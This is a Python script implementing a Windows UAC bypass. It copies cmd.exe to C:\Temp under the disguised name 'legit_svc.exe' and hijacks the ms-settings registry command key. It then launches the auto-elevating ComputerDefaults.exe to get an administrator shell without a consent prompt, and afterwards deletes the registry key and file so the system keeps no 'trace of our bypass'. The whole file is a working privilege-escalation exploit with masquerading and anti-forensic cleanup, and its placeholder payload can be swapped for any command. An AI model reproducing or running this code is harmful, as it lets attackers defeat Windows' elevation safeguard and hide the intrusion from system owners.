import os
import time

TEMP_DIR = r"C:\Temp"
NEW_SHELL = os.path.join(TEMP_DIR, "legit_svc.exe")
REG_KEY = r"HKCU\Software\Classes\ms-settings\Shell\Open\command"

UAC_APP = "cmd.exe" # default folder is C:\Windows\System32
startupScript = '/t:0A /k echo UAC Bypassed: Administrator Privileges' # sets the cmd green and prints text
startupScript = startupScript.replace('"', '\\"') # Parsing

def setup_payload():
    
    #
    # Since Windows knows that cmd.exe shouldn't be spawned by ComputerDefaults, we can easily just copy
    # the shell into a temporary directory, then call the original shell from the proxied shell.
    #
    
    if not os.path.exists(TEMP_DIR):
        os.makedirs(TEMP_DIR)
    print(f"Copying shell to {NEW_SHELL} ....")

    os.system(f'echo F | xcopy C:\\Windows\\System32\\cmd.exe "{NEW_SHELL}" /y')
    
def run_bypass():
    print("Registry Hijacking....")
    
    payload = f'"{NEW_SHELL}" /C start {UAC_APP} {startupScript}'
    
    # Registry Modification: Registry Hijacking
    os.system(f'reg add "{REG_KEY}" /ve /t REG_SZ /d "{payload}" /f')
    os.system(f'reg add "{REG_KEY}" /v "DelegateExecute" /t REG_SZ /d "" /f')

    print("Triggering Elevation....")
    
    # Trigger Vulnerable Application
    os.system("start ComputerDefaults.exe")
    
    # Small buffer to let the window draw
    time.sleep(2)


# A cleanup function to ensure the system doesn't retain a trace of our bypass
def cleanup():
    # Registry Cleanup
    os.system(f'reg delete "HKCU\\Software\\Classes\\ms-settings" /f') 
    
    # Delete Temp File
    os.system('del C:\Temp\legit_svc.exe')
    print("System Clean....")

if __name__ == "__main__":
    
    # Ensure the system is ready for the paylod
    os.system(f'reg delete "HKCU\\Software\\Classes\\ms-settings" /f >nul 2>&1') 
    
    setup_payload()
    run_bypass()
    cleanup()